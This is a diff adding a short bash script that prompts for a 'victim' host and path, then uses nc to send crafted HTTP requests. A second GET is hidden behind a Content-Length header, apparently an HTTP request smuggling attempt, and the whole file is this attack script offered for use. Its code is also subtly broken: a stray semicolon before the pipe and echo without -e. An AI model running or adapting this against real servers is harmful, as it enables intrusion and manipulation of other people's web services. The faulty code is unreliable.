@@ -1,0 +1,14 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Path: "
+read pagepath
+
+echo "GET / HTTP/1.1\r\n
+Host: $victim\r\n
+Content-Length: 44\r\n
+
+GET /$pagepath HTTP/1.1\r\n
+Host: $victim\r\n
+\r\n"; | nc $victim 80
